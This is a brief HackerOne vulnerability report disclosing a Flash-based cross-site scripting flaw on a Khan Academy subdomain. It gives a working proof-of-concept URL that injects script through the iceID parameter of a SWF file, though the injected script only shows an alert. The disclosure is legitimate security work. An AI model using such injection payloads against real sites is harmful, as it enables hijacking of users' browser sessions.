# HackerOne Report: XSS at  http://smarthistory.khanacademy.org
**Report ID:** 6575
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic

## Vulnerability Information & PoC
Hi,

There is a SWF-based XSS : http://smarthistory.khanacademy.org/assets/flash/cozimo.swf?iceID=\%22%29%29}catch%28e%29{alert%28%27XSS%27%29;}//

Opening the link would trigger JavaScript execution! Works in possibly any browser with **Adobe Flash, i.e - Chrome, Firefox**


Thanks!

## Discussion & Remediation Timeline
